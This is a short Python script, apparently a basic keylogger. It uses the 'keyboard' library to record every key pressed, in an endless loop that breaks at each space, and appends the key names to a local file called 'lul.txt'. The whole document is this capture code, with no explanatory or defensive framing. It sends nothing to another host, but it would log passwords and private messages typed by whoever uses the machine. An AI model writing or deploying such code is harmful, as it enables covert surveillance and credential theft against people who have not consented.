import keyboard as kb
import time as t
def write_into_file(rec):
    f = open('lul.txt','a+')
    for i in range(0, len(rec)):
        if rec[i].event_type == 'down':
            f.write(rec[i].name + '')
    f.write(' ')
    f.close()
while True:
    rec = kb.record(until='space')
    write_into_file(rec)